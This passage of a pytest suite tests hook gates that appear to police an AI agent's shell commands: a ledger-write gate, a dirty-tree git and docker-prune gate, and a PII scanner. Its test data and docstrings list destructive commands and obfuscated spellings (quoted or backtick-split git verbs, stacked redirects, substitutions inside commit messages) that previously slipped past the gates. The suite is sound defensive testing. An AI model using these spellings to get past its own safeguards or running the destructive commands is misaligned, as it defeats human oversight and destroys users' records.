    ("the second target empties the validator",
     "cat scripts/ledger_add.py > /tmp/a > scripts/ledger_add.py", 2),
    ("the second target empties the gate's own state file",
     "cat README.md > /tmp/a > .claude/ledger_state.json", 2),
    ("the third target is the harmful one",
     "cat ledger/2026.csv > /tmp/a > /tmp/b > ledger/2026.csv && git commit -m x", 2),
    # ...and the direction that says the reader did not simply start refusing every redirect
    ("every target of the segment points away",
     "cat ledger/2026.csv > /tmp/a > /tmp/b && git commit -m x", 0),
    ("one harmless target",
     "cat ledger/2026.csv > /tmp/backup.csv && git commit -m x", 0),
])
def test_every_redirect_target_of_a_segment_is_read(tmp_path, what, command, expected):
    """A shell opens and truncates EVERY redirection of a command, so a segment carrying two of
    them writes two files. Both readers asked `_REDIRECT_INTO_RX.search(...)` and stopped at the
    first: `cat ledger/2026.csv > /tmp/a > ledger/2026.csv && git commit` emptied the books and
    committed them, exit 0, with the harmless target standing in front."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == expected, what


@pytest.mark.parametrize("segment,targets", [
    ("cat a > /tmp/x > ledger/2026.csv", ["/tmp/x", "ledger/2026.csv"]),
    ("cat a >> ledger/2026.csv", ["ledger/2026.csv"]),
    ("cat a > \"ledger/2026.csv\"", ["ledger/2026.csv"]),
    # the CLOBBER OVERRIDE: `>|` redirects exactly like `>`, and the reader did not know it
    ("cat a >| ledger/2026.csv", ["ledger/2026.csv"]),
    ("cat a > /tmp/x >| scripts/ledger_add.py", ["/tmp/x", "scripts/ledger_add.py"]),
    # ...and a descriptor duplication, which writes no file and must NOT yield a target
    ("python scripts/harness.py doctor 2>&1", []),
    ("cat a", []),
])
def test_the_redirect_reader_names_every_target_and_only_targets(segment, targets):
    """`_redirect_targets` asked at the function, because the END-TO-END verdict cannot measure it
    for `>|`: the `|` splits the stage and the second stage's verb is not a reading one, so those
    lines are refused either way. A case that passes with and without the fix is not a measurement,
    so the property is pinned where it can fail — the docstring of `_redirect_targets` says EVERY,
    and this is what makes that word true rather than hopeful."""
    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    assert gate._redirect_targets(segment) == targets, segment


def test_the_module_form_of_the_entry_point_is_not_the_entry_point(tmp_path):
    """`python -m scripts.harness` is an inline payload naming a MODULE, not the script argument
    the exemption is anchored to — and `-m` is exactly the letter BUG-0063's tail scan used to
    catch by accident, from the wrong side of the script name."""
    ledger_repo(tmp_path)
    command = ("python -m scripts.harness submit-result --summary 'booked via ledger_add.py' "
               "&& git commit -m x")
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2


def test_a_harmless_copy_out_does_not_disarm_the_cd_form(tmp_path):
    """`_LEDGER_PATH_RX` matching routed into the copy-out branch, and RETURNING from there skipped
    the working-directory check entirely — so one prepended read re-opened the `cd ledger && sed -i`
    hole that the previous round had just closed. The exemption now falls through."""
    ledger_repo(tmp_path)
    command = ("cp ledger/2026.csv /tmp/b.csv && cd ledger && "
               "sed -i s/119.00/150.00/ 2026.csv && cd .. && git commit -m x")
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2


@pytest.mark.parametrize("command", [
    "mv ledger/2026.csv /tmp/archive-2026.csv && git add -A && git commit -m 'archive the year'",
    "Move-Item ledger/2026.csv C:/tmp/ ; git commit -m x",
])
def test_moving_the_ledger_out_is_a_delete_not_a_read(tmp_path, command):
    """A copy-out leaves the ledger intact; a MOVE-out deletes it. Grouping the two took a year's
    books out of the repo and committed the deletion — after which `judge()` found no 2026.csv and
    every later check was clean: the data gone, the gate satisfied."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, command


def test_copying_the_ledger_out_stays_allowed(tmp_path):
    """...and the read that motivated the exemption still works: taking a backup is not a write."""
    ledger_repo(tmp_path)
    assert run_ledger(
        tmp_path, shell(tmp_path, "cp ledger/2026.csv /tmp/backup.csv && git commit -m x")
    ).returncode == 0


@pytest.mark.parametrize("text", [
    # passive voice — the most natural way a policy line is written
    "The ledger may not be edited by hand.",
    "The ledger is not to be edited directly.",
    "`ledger/*.csv` must not be written by an agent.",
    "The ledger cannot be edited outside the script.",
    # German
    "Das Ledger darf nicht von Hand bearbeitet werden.",
    "Direkte Änderungen an `ledger/*.csv` sind untersagt.",
    "Ledger-Einträge ausschließlich über das Skript.",
    # a table row and bullet fragments, which carry no verb at all
    "| `ledger/*.csv` | Bookkeeper | script only — no manual edits |",
    "- Ledger: script only.",
    "- `ledger/*.csv`: hands off.",
    "- No manual ledger changes.",
    # other plain English
    "The ledger must only be touched by `scripts/ledger_add.py`.",
    "Ledger rows are immutable once booked.",
    "Booked ledger rows may not be altered.",
])
def test_the_contradiction_sweep_catches_the_passive_and_terse_shapes(text):
    """Fourteen prohibition shapes a reviewer planted after the first calibration — every one of
    them passed. The structural gaps were: no `ledger … NEGATION … VERB` alternation (passive
    voice), `cannot` not matching `\\bnot\\b`, German inflections (`bearbeitet`, `Änderungen`,
    `untersagt`, `ausschließlich`), and fragments with no verb at all, which a three-part rule
    cannot reach by construction.

    Four rounds of a reviewer finding another class is itself the finding: enumerating
    prohibitions is the weaker defence, and the POSITIVE sweep is the one that generalises. This
    stays because the realistic regression — someone appends a line to a file that already states
    the rule — is exactly where the positive check cannot fire."""
    assert ledger_prohibitions(text), text


# -- R10/R11: shell hygiene, promoted to FIRM gates by "maximal härten" -------

HYGIENE_GATE = os.path.join(TEAM_KITS, "dev-team", "hooks", "gate_shell_hygiene.py")


def hygiene_repo(tmp_path, dirty=False, name="myproject"):
    work = tmp_path / name
    os.makedirs(str(work), exist_ok=True)
    for args in (["init", "-q"], ["config", "user.email", "t@example.com"],
                 ["config", "user.name", "t"]):
        subprocess.run(["git"] + args, cwd=str(work), capture_output=True, timeout=60)
    write(str(work / "a.txt"), "one\n")
    for args in (["add", "-A"], ["commit", "-qm", "one"], ["branch", "-M", "main"],
                 ["branch", "feat/x"]):
        subprocess.run(["git"] + args, cwd=str(work), capture_output=True, timeout=60)
    if dirty:
        write(str(work / "a.txt"), "one\nuncommitted\n")
    return work


def run_hygiene(work, command, tool="Bash"):
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(work), HARNESS_KERNEL_PATH=TEAM_KITS)
    payload = {"hook_event_name": "PreToolUse", "tool_name": tool, "cwd": str(work),
               "tool_input": {"command": command}}
    return subprocess.run([sys.executable, HYGIENE_GATE], input=json.dumps(payload),
                          capture_output=True, text=True, env=env, timeout=120)


@pytest.mark.parametrize("command", [
    "docker system prune -af", "docker volume prune", "docker prune", "docker image prune -a",
])
def test_a_daemon_wide_prune_is_refused(tmp_path, command):
    """R10 (devops SKILL §3). A prune reaches every project on the daemon by construction, so
    there is no target to check — "a real OOM hunt stopped a NEIGHBOUR project's production
    database". `docker system prune` and `docker volume prune` also put a SUBCOMMAND where the
    destructive-verb pattern expects the verb, so gating the prune check behind that pattern left
    the two most dangerous forms as the only ones never examined."""
    work = hygiene_repo(tmp_path)
    assert run_hygiene(work, command).returncode == 2, command


@pytest.mark.parametrize("command", [
    "docker ps", "docker logs api", "docker inspect api", "docker compose build",
    "docker stats", "docker compose up -d", "docker compose down",
])
def test_reading_and_scoped_docker_work_is_never_blocked(tmp_path, command):
    """Diagnosis is how you find out what is going on, and a gate that blocks diagnosis gets
    worked around. `docker compose down` with no target is scoped to this directory already."""
    work = hygiene_repo(tmp_path)
    assert run_hygiene(work, command).returncode == 0, command


@pytest.mark.parametrize("command", [
    "git merge feat/x", "git rebase main", "git pull", "git reset --hard HEAD~1",
    "git checkout feat/x", "git switch main", "git cherry-pick abc123",
])
def test_risky_git_work_on_a_dirty_tree_is_refused(tmp_path, command):
    """Parity risk R11, scoped to the operations that can LOSE the uncommitted work.

    THE QUOTATION THAT STOOD HERE IS GONE. It quoted `constitution §8` — and this docstring is one
    file while §8 is three different sections: Git in the dev and research kits, Behavior in
    office, whose constitution carries no dirty-tree rule at all. A quotation nothing checks is a
    claim that rots, so the rule is named by the risk id and the behaviour is measured below.
    """
    work = hygiene_repo(tmp_path, dirty=True)
    result = run_hygiene(work, command)
    assert result.returncode == 2, command
    assert "dirty tree" in result.stderr


@pytest.mark.parametrize("command", [
    "git add -A", "git stash", "git stash push -m wip", "git checkout -b feat/new",
    "git switch -c feat/new", "git status", "git diff", "git commit -m x",
    "git checkout -- a.txt", "git checkout main -- a.txt",
])
def test_the_remedies_stay_open_on_a_dirty_tree(tmp_path, command):
    """A rule that blocks its own remedy is a deadlock. `checkout -b` CREATES a branch and carries
    the changes along; `checkout -- <path>` is the Discard the constitution itself offers."""
    work = hygiene_repo(tmp_path, dirty=True)
    assert run_hygiene(work, command).returncode == 0, command


@pytest.mark.parametrize("command", [
    "git merge feat/x", "git rebase main", "git reset --hard HEAD~1", "git checkout feat/x",
])
def test_a_clean_tree_is_not_gated(tmp_path, command):
    work = hygiene_repo(tmp_path)
    assert run_hygiene(work, command).returncode == 0, command


def test_the_dirty_message_names_the_files_and_the_offer(tmp_path):
    """`_git` strips its output, so the leading space of an unstaged ` M a.txt` is already gone
    and a fixed `line[3:]` offset ate the first character — "a.txt" was reported as ".txt"."""
    work = hygiene_repo(tmp_path, dirty=True)
    stderr = run_hygiene(work, "git merge feat/x").stderr
    assert "a.txt" in stderr
    assert "Commit, Stash or Discard" in stderr


def test_a_directory_that_is_not_a_worktree_is_not_gated(tmp_path):
    """Fail-OPEN here, deliberately, and unlike the ledger gate: "cannot tell" means there is no
    uncommitted work to protect, not that a hazard is being hidden."""
    plain = tmp_path / "plain"
    os.makedirs(str(plain), exist_ok=True)
    assert run_hygiene(plain, "git merge feat/x").returncode == 0


@pytest.mark.parametrize("command", [
    'git "reset" --hard HEAD~1',
    "git rese''t --hard HEAD~1",
    "git reset --ha\\\nrd HEAD~1",
    'git "merge" feat/x',
    "git reb''ase main",
    'git "checkout" main',
    'sudo "git" merge feat/x',
    "git --attr-source HEAD merge feat/x",
    "git $'merge' feat/x",
    "V=merge; git $V feat/x",
])
def test_the_dirty_tree_rule_reads_the_same_verbs_every_other_git_gate_does(tmp_path, command):
    """This hook kept its own regexes, so it kept the defects the shared reader was written to end.

    It was not in the grep that converted the others (`git_invocation_text`/`wants_push_or_merge`
    appear nowhere in it), and nothing noticed, because its own tests only ever spell the verbs
    the plain way. Measured as real hook processes on a dirty tree: `git reset --hard HEAD~1`
    blocked and `git "reset" --hard HEAD~1` ran, `git merge feat/x` blocked and `git "merge"
    feat/x` ran, and `git reset --ha\\<newline>rd HEAD~1` was refused by NO hook in the kit — the
    constitution's §8 data-loss protection off by two characters.

    The last three are the classes the same conversion brings with it: a wrapper word, a global
    option this reader cannot know, and a verb the shell builds at run time.
    """
    work = hygiene_repo(tmp_path, dirty=True)
    result = run_hygiene(work, command)
    assert result.returncode == 2, command
    assert "dirty tree" in result.stderr, (command, result.stderr)


@pytest.mark.parametrize("command", [
    "git reset>/dev/null --hard HEAD~1",
    "git reset --hard>/dev/null HEAD~1",
    "git merge>/dev/null feat/x",
    "git>/dev/null merge feat/x",
    "git checkout>/dev/null main",
])
def test_the_dirty_tree_rule_reads_a_redirection_as_shell_syntax(tmp_path, command):
    """Same §8 protection, switched off by one `>` instead of two quotes.

    A redirection is a metacharacter: it ends the word before it and takes its target with it. The
    word reader did not know that, so the verb came back as `reset>/dev/null` and this gate — which
    now correctly asks for the SUBCOMMAND — matched nothing. `git reset --hard>/dev/null HEAD~1` is
    the second half and the sharper one: the verb IS read, but `--hard` was spelled
    `--hard>/dev/null` and the flag test that decides "this destroys uncommitted work" missed it.
    Measured as real hook processes on a dirty tree, all of these ran.
    """
    work = hygiene_repo(tmp_path, dirty=True)
    result = run_hygiene(work, command)
    assert result.returncode == 2, command
    assert "dirty tree" in result.stderr, (command, result.stderr)


@pytest.mark.parametrize("command", [
    "git reset --har`d HEAD~1",
    "git mer`ge feat/x",
    "git rese`t --hard HEAD~1",
])
def test_the_dirty_tree_rule_reads_the_powershell_escape_too(tmp_path, command):
    """Same hook, second tool rail: this gate is registered on `PowerShell` (`SHELL_TOOLS`) and
    PowerShell escapes with a backtick. Sent as the PowerShell tool, which is how it arrives."""
    work = hygiene_repo(tmp_path, dirty=True)
    result = run_hygiene(work, command, tool="PowerShell")
    assert result.returncode == 2, command
    assert "dirty tree" in result.stderr, (command, result.stderr)


def test_a_command_too_long_to_read_still_names_a_verb_in_the_refusal(tmp_path):
    """The `GIT_READ_LIMIT` answer — "this could be any git command" — travels all the way into a
    real refusal, on the one gate that puts the verb into its message.

    Two things meet here and neither has cover on its own: the fail-closed bound (a hook that
    cannot finish reading must not ALLOW) and `UNRESOLVED_SUBCOMMAND` being an object rather than a
    string. This gate renders that verb into its stderr, and it used to build the text with `+`,
    which is a TypeError on anything but a string — i.e. a crash in the path that exists for the
    case nobody exercises.
    """
    work = hygiene_repo(tmp_path, dirty=True)
    result = run_hygiene(work, "echo " + "x" * (_compat.GIT_READ_LIMIT + 1))
    assert result.returncode == 2
    assert "dirty tree" in result.stderr
    assert "<unresolved>" in result.stderr


@pytest.mark.parametrize("command", [
    'git commit -m "merge the feature once the tree is clean"',
    'git commit -m "reset --hard is what broke it"',
    'echo "git checkout main"',
    "git checkout -b feat/new",
    "git checkout -- a.txt",
])
def test_the_dirty_tree_rule_still_reads_prose_and_remedies_as_what_they_are(tmp_path, command):
    """THE COUNTER-ASSERTION for the conversion above — the reason a reader that simply searched
    for the words would be the wrong fix. A commit MESSAGE naming a merge is an argument, and
    `checkout -b` / `checkout -- <path>` are how the agent gets the tree clean again."""
    work = hygiene_repo(tmp_path, dirty=True)
    result = run_hygiene(work, command)
    assert result.returncode == 0, (command, result.stderr)


@pytest.mark.parametrize("command", [
    'docker "stop" neighbour-db', "docker st''op neighbour-db",
    # ...and the shapes a POSITIONAL reader lost: every global option stood where it expected the
    # verb. Measured as real hook processes before the conversion, all four rc 0.
    "docker --context remote stop neighbour-db",
    "docker -H tcp://x:2375 stop neighbour-db",
    "docker --log-level debug container rm -f neighbour-db",
])
def test_the_docker_rule_reads_the_verb_the_way_the_git_rule_does(tmp_path, command):
    """R10 decides on `_compat.docker_invocations` — the same reader the git half of this hook
    already uses — instead of on a position in a regex.

    There is no daemon in a test, so the container lookup returns None and the gate falls open by
    design; what is asserted is that the CALL is seen at all, with its verb and its target, which
    is the step every one of these spellings used to lose.
    """
    hygiene = load_kit_module("gate_shell_hygiene", HYGIENE_GATE)
    calls = hygiene._destructive_docker_calls(command)
    assert calls, command
    assert any(hygiene._docker_targets(tokens) == ["neighbour-db"]
               for _verb, tokens, _whole in calls), (command, calls)


# -- round 8: the directory destination, and prose that only looks like code --

@pytest.mark.parametrize("command", [
    "mv export-2027.csv ledger/ && git add -A && git commit -m 'import 2027'",
    "cp /tmp/2026.csv ledger/ && git commit -m x",
    "cp /tmp/2026.csv ledger && git commit -m x",
    "tee ledger/2027.csv < /tmp/x && git commit -m x",
])
def test_a_bare_directory_destination_is_a_write_into_the_ledger(tmp_path, command):
    """The path pattern required a name ending in `.csv`, so a trailing `ledger/` — the natural way
    to write "drop the corrected export in there" — matched nothing, and the file landed in the
    ledger and was committed in the same call. Verified end to end before the fix: the broken row
    was in HEAD. The explicit-filename forms had always been refused, which is exactly why this
    survived three rounds of probing around it."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, command


@pytest.mark.parametrize("command", [
    "cp ledger/2026.csv /tmp/backup.csv && git commit -m 'checkpoint'",
    "mv inbox/re.pdf archive/2026/ && git commit -m 'file it'",
    "mv outbox/draft.md /tmp/ && git commit -m x",
])
def test_widening_the_path_pattern_did_not_catch_innocent_moves(tmp_path, command):
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, command


@pytest.mark.parametrize("command", [
    "git commit -m 'rm ledger/2026.csv from $HOME was wrong'",
    "git commit -m 'restore ledger/2026.csv after the $EUR mixup'",
    "git commit -m 'ledger/2026.csv: fee $USD 12, checkout pending'",
    "git commit -m restore -- ledger/2026.csv",
    "git commit -m checkout ledger/2026.csv",
])
def test_a_message_that_only_looks_like_code_is_still_prose(tmp_path, command):
    """Two false-positive classes, with two different causes.

    A SINGLE-quoted payload is inert by construction — bash expands nothing at all inside single
    quotes — so testing it for `$NAME` refused three commit messages that write nothing. And a
    one-word unquoted message that happens to be a git verb (`-m restore -- ledger/2026.csv`) was
    refused because the unquoted alternative had been dropped entirely; it is back, safe now that
    the inert test knows `[<>]\\(`."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, command


@pytest.mark.parametrize("command", [
    'git commit -m "$(sed -i s/1/2/ ledger/2026.csv)"',
    "git commit -a -m <(sed -i s/119.00/150.00/ ledger/2026.csv)",
    'git commit -m "`sed -i s/1/2/ ledger/2026.csv`"',
    'git commit -m "${x:=$(sed -i s/1/2/ ledger/2026.csv)}"',
])
def test_a_double_quoted_or_unquoted_payload_is_still_checked(tmp_path, command):
    """The counterpart: relaxing single quotes must not relax the two forms bash DOES expand."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, command


# -- R3/R5/R6: the three parity risks the disposition answers with tests ------

PII_SCAN = os.path.join(TEAM_KITS, "office-team", "templates", "repo", "scripts", "pii_scan.py")
MASTER_DATA = """categories:
  expense: []
  income: []
counterparties:
  - canonical: "Muster GmbH"
    aliases: ["MUSTER GMBH BERLIN", "Muster Handel"]
  - canonical: "Erika Mustermann"
    aliases: []
"""


def pii_project(tmp_path):
    work = tmp_path / "office"
    for part in ("ledger", "scripts", "project_memory", "archive/2026"):
        os.makedirs(str(work / part.replace("/", os.sep)), exist_ok=True)
    shutil.copy(PII_SCAN, str(work / "scripts" / "pii_scan.py"))
    write(str(work / "project_memory" / "master_data.yaml"), MASTER_DATA)
    write(str(work / "ledger" / "2026.csv"), "id,counterparty\nL2026-0001,Muster GmbH\n")
    for args in (["init", "-q"], ["config", "user.email", "t@example.com"],
                 ["config", "user.name", "t"]):
        subprocess.run(["git"] + args, cwd=str(work), capture_output=True, timeout=60)
    return work


def run_pii(work, *args):
    subprocess.run(["git", "add", "-A"], cwd=str(work), capture_output=True, timeout=60)
    return subprocess.run([sys.executable, str(work / "scripts" / "pii_scan.py")] + list(args),
                          cwd=str(work), capture_output=True, text=True, timeout=120)


def test_a_counterparty_name_outside_the_ledger_is_found(tmp_path):
    """R3, and the incident is specific: a real day-1 deployment committed 140 customer names —
    not through a leak, through ordinary filing notes. An agent writes what it sees, and what it
    sees is names."""
    work = pii_project(tmp_path)
    assert run_pii(work).returncode == 0, "the baseline must be clean"
    write(str(work / "project_memory" / "tasks" / "active" / "TSK-0001.yaml"),
          "title: filed the invoice from Muster GmbH\n")
    result = run_pii(work)
    assert result.returncode == 1
    assert "TSK-0001.yaml:1" in result.stderr and "Muster GmbH" in result.stderr
    assert "140 names" in result.stderr


@pytest.mark.parametrize("text,found", [
    ("title: waiting on MUSTER GMBH BERLIN\n", True),        # alias
    ("title: waiting on muster handel\n", True),             # alias, lowercase
    ("title: three documents filed\n", False),               # no name at all
])
def test_aliases_and_case_are_matched(tmp_path, text, found):
    work = pii_project(tmp_path)
    write(str(work / "project_memory" / "tasks" / "active" / "TSK-0001.yaml"), text)
    assert (run_pii(work).returncode == 1) is found, text


@pytest.mark.parametrize("rel,text", [
    ("ledger/2026.csv", "id,counterparty\nL2026-0001,Erika Mustermann\n"),
    ("project_memory/generated/filing_log.yaml", "entries:\n  - Erika Mustermann\n"),
    ("archive/2026/invoice.txt", "Rechnung an Erika Mustermann"),
    ("archive/2026/scan.pdf", "Erika Mustermann"),
])
def test_where_names_legitimately_live_is_exempt(tmp_path, rel, text):
    """The ledger by statutory retention, everything under `generated/` because it is rebuilt from
    the tracked state and gitignored (on disk, out of history) — the filing scan index spec II.9
    plans is the case with names in it — and the ARCHIVED SOURCE document because it IS the
    business record: scanning it would flag every file the business is required to keep."""
    work = pii_project(tmp_path)
    write(str(work / rel.replace("/", os.sep)), text)
    assert run_pii(work).returncode == 0, rel


def test_the_scanner_does_not_report_itself(tmp_path):
    """It ships in the repo template, so it is tracked, and its comments carry example names — on
    its first run it reported its own docstring. "Muster GmbH" is a placeholder here and a
    plausible real customer elsewhere, so the file is exempt; `scripts/` as a whole is NOT, because
    a name hardcoded in `process_doc.py` would be a genuine finding."""
    work = pii_project(tmp_path)
    body = open(str(work / "scripts" / "pii_scan.py"), encoding="utf-8").read()
    assert "scripts/pii_scan.py" in body, "the exemption must be explicit, not incidental"
    assert run_pii(work).returncode == 0


def test_the_scan_is_honest_about_what_it_cannot_do(tmp_path):
    """An empty counterparty list means there is nothing to match against — and saying so beats
    printing "clean", which would read as "no names anywhere"."""
    work = pii_project(tmp_path)
    write(str(work / "project_memory" / "master_data.yaml"),
          "categories:\n  expense: []\ncounterparties: []\n")
    result = run_pii(work)
    assert result.returncode == 0
    assert "grows with the project" in result.stdout


def test_staged_only_looks_at_what_is_about_to_be_committed(tmp_path):
    work = pii_project(tmp_path)
    subprocess.run(["git", "add", "-A"], cwd=str(work), capture_output=True, timeout=60)
    subprocess.run(["git", "commit", "-qm", "one"], cwd=str(work), capture_output=True, timeout=60)
    write(str(work / "notes.md"), "call Muster GmbH back\n")
    unstaged = subprocess.run([sys.executable, str(work / "scripts" / "pii_scan.py"), "--staged"],
                              cwd=str(work), capture_output=True, text=True, timeout=60)
    assert unstaged.returncode == 0
    subprocess.run(["git", "add", "-A"], cwd=str(work), capture_output=True, timeout=60)
    staged = subprocess.run([sys.executable, str(work / "scripts" / "pii_scan.py"), "--staged"],
                            cwd=str(work), capture_output=True, text=True, timeout=60)
    assert staged.returncode == 1


# A markdown BLOCK boundary: a blank line, or the start of the next list item. That is the unit a
# reader takes in as one statement, and it is what a prose pin has to be measured in — see
# `test_the_ui_inventory_snapshot_rule_is_shipped`.
_MD_BLOCK_BREAK_RX = re.compile(r"^[ \t]*$|^[ \t]*(?:[-*+]|\d+\.)[ \t]", re.MULTILINE)
# A sentence ends at `.`/`!`/`?` plus whitespace. Crude for English at large, exact for this prose.
_SENTENCE_SPLIT_RX = re.compile(r"(?<=[.!?])\s+")


def _markdown_block_around(text, start, end):
    """The one list item or paragraph that `text[start:end]` sits in.

    A list item OWNS its marker line, so a break that is a marker starts the block it matched; a
    blank line belongs to neither side, so the block starts after it.
    """
    left = 0
    for match in _MD_BLOCK_BREAK_RX.finditer(text, 0, start):
        left = match.start() if match.group().strip() else match.end()
    match = _MD_BLOCK_BREAK_RX.search(text, end)
    return text[left:match.start() if match else len(text)]


def test_the_ui_inventory_snapshot_rule_is_shipped():
    """R5 (parity row 25/97). A real run silently deleted the Account button, and the rule traded
    for that is: a visible element may not be removed or replaced without an approved CR, and a
    snapshot test is what notices. It used to live as a pattern in the `testing_guidelines.yaml`
    template; the V2 lockstep dissolved that file, so the rule now lives where the roles that must
    obey it read — the constitution's CR line, the frontend loop and the QA loop — and each of the
    three has to name the snapshot AND the CR requirement in one breath. Pinned here so the II.11/3
    shrink cannot drop the half that gives the rule teeth and leave the half that sounds nice.
    """
    homes = (os.path.join("constitution", "AGENTS.md"),
             os.path.join("skills", "frontend-developer", "SKILL.md"),
             os.path.join("skills", "quality-engineer", "SKILL.md"))
    for rel in homes:
        body = open(os.path.join(TEAM_KITS, "dev-team", rel), encoding="utf-8").read()
        mention = re.search(r"UI\s+inventory\s+snapshot", body, re.IGNORECASE)
        assert mention, "%s no longer names the UI inventory snapshot" % rel
        # The two halves have to stand TOGETHER: a snapshot named on its own reads as a nice-to-have
        # assertion, and a CR rule named on its own has nothing that notices when it is broken. So
        # what is looked for is the RULE — one sentence that binds REMOVING a visible element to a
        # CR — in the same markdown block as the snapshot, not a `CR` token near it. The earlier cut
        # took a bare `\bCR\b` inside ±300 characters, and in the constitution the glossary line
        # "**CR** (change to an APPROVED revision)" three lines up satisfied it on its own: the duty
        # could be replaced by "visible UI elements may be removed freely" and the test stayed green
        # (measured 2026-07-27). The three files phrase the rule differently ("ALWAYS a CR", "an
        # approved CR", "without an approved CR = automatic FAIL"), which is why it is the verb and
        # the CR that are pinned rather than any wording.
        block = _markdown_block_around(body, mention.start(), mention.end())
        assert any(re.search(r"remov|replac|renam|delet", sentence, re.IGNORECASE)
                   and re.search(r"\bCR\b", sentence)
                   for sentence in _SENTENCE_SPLIT_RX.split(block)), (
            "%s names the UI inventory snapshot, but nothing in the same block says that removing "
            "or replacing a visible element takes a CR — that requirement is what the snapshot "
            "exists to enforce, and a snapshot without it is an assertion nobody has to honour"
            % rel)


def test_the_design_ambition_is_still_the_users_call():
    """The rule the dissolved `design.yaml` gate carried: never ship ONE design silently.

    V1 blocked the merge when a UI `design.yaml` named a chosen direction but no `ambition:` — the
    synaipse failure mode, where a single design was produced and documented as if the user had
    picked it. `design.yaml` is gone and with it the field a gate could read, so the guarantee moved
    into the flow: the PM ASKS, and the answer becomes a Decision item the designer reads. Two
    tests died with the monolith and nothing replaced them, which is how a rule quietly becomes a
    preference — this pins the two halves that are left, and says plainly that no gate sees either.
    """
    pm = open(os.path.join(TEAM_KITS, "dev-team", "skills", "project-manager", "SKILL.md"),
              encoding="utf-8").read()
    ask = re.search(r"AMBITION[^\n]*user'?s call", pm)
    assert ask, "the PM SKILL no longer makes the design ambition the user's call"
    # THE STEP THE AMBITION STANDS IN, and not a count of characters after it. The three halves
    # below have to belong to ONE instruction; a character window says that only as long as nobody
    # writes a sentence, and the step grew past 400 the day the question call went from one item to
    # four (TSK-0105). The unit the file itself uses is the numbered step, so that is the unit.
    steps = [m.start() for m in re.finditer(r"(?m)^\s*\d+\. ", pm)]
    start = max((one for one in steps if one <= ask.start()), default=0)
    window = pm[start:min((one for one in steps if one > ask.start()), default=len(pm))]
    # THE PROHIBITION, NOT ITS OBJECT: the text used to forbid deciding "this" silently and now
    # forbids deciding "any of it", because the same question call grew from the ambition to four
    # items (TSK-0105). A regex on the old object would have demanded the narrower rule back. What
    # has to stand is a prohibition on deciding silently, whatever it is said about.
    assert re.search(r"NEVER decide\b[^\n]{0,40}silently", window), (
        "the PM SKILL asks for the ambition but no longer forbids deciding it silently — that "
        "prohibition IS the rule the deleted design.yaml gate enforced")
    assert re.search(r"Decision item", window), (
        "the PM SKILL never says where the ambition is recorded; a decision nothing stores is a "
        "decision the next session re-invents")
    designer = open(os.path.join(TEAM_KITS, "dev-team", "skills", "product-designer", "SKILL.md"),
                    encoding="utf-8").read()
    assert re.search(r"Decision item[^\n]*AMBITION", designer, re.IGNORECASE), (
        "the designer SKILL no longer reads the Decision item holding the ambition, so the answer "
        "the PM records reaches nobody")


def test_delivery_freshness_compares_served_bytes_to_the_build(tmp_path):
    """R6 (parity row 100). A green smoke test against a stale bundle certifies code that is not
    the code under review, and every way it happens — a leftover dev server on the port, a `dist/`
    from another branch, a service worker replaying a cached shell — renders perfectly."""
    import http.server
    import threading
    kit_browser_checks = load_kit_module(
        "kit_browser_checks_under_test",
        os.path.join(TEAM_KITS, "dev-team", "templates", "repo", "scripts",
                     "kit_browser_checks.py"))

    served_dir = tmp_path / "served"
    os.makedirs(str(served_dir), exist_ok=True)
    write(str(served_dir / "index.html"), "<html>built</html>")

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=str(served_dir), **kw)

        def log_message(self, *a):
            pass

    server = http.server.HTTPServer(("localhost", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        base = "http://localhost:%d/" % server.server_address[1]
        served = kit_browser_checks._served_index_hash(base)
        assert served == kit_browser_checks._file_hash(str(served_dir / "index.html"))
        write(str(tmp_path / "stale.html"), "<html>STALE</html>")
        assert served != kit_browser_checks._file_hash(str(tmp_path / "stale.html"))
    finally:
        server.shutdown()
    # ...and it stays SILENT when it cannot compare: a custom entry, an auth wall or a redirect is
    # not a misconfiguration, and a check that guesses there would fail honest projects.
    assert kit_browser_checks._served_index_hash("http://localhost:1/") is None
    assert kit_browser_checks._file_hash(str(tmp_path / "nope.html")) is None


# -- round 9: the verb half becomes a read-only ALLOWLIST ---------------------

@pytest.mark.parametrize("command", [
    "curl -s -o ledger/2026.csv https://bank.example/export && git add -A && git commit -m 'x'",
    "wget -q -O ledger/2026.csv https://bank.example/export && git commit -m x",
    "tar -xf backup.tar -C ledger/ && git add -A && git commit -m 'restore'",
    "unzip -o backup.zip -d ledger/ && git add -A && git commit -m 'restore'",
    "split -l 500 big.csv ledger/part- && git commit -m x",
    "awk -i inplace '{print}' ledger/2026.csv && git commit -m x",
    "sort -o ledger/2026.csv ledger/2026.csv && git commit -m x",
    "touch ledger/2027.csv && git commit -m x",
])
def test_any_unknown_verb_touching_the_ledger_counts_as_a_write(tmp_path, command):
    """FOUR review rounds in a row the finding was "another spelling the denylist did not have".
    The PATH half stopped generating them the moment it was rewritten from "the shapes I thought
    of" to "what a ledger path IS"; the verb half still enumerated. It is now a read-only
    ALLOWLIST — the same decision `gate_write_scope` in this kit already makes — so a segment that
    touches a ledger path is a WRITE unless its verb is known to only read.

    `sort -o` is the sharpest of these: it was proven end to end, the header stopped being the
    first line, `--validate` failed on the committed file, and the block arrived one commit late."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, command


@pytest.mark.parametrize("command", [
    "grep -r ledger . > /tmp/hits && git commit -m x",
    "echo ledger > /tmp/x && git commit -m y",
    'cp ledger/2026.csv /tmp/b.csv && git commit -m "$USER ledger backup"',
    "wc -l ledger/2026.csv && git commit -m x",
    "cat ledger/2026.csv | head -3 && git commit -m x",
    "diff ledger/2026.csv /tmp/old.csv && git commit -m x",
    "git add ledger/2026.csv && git commit -m x",
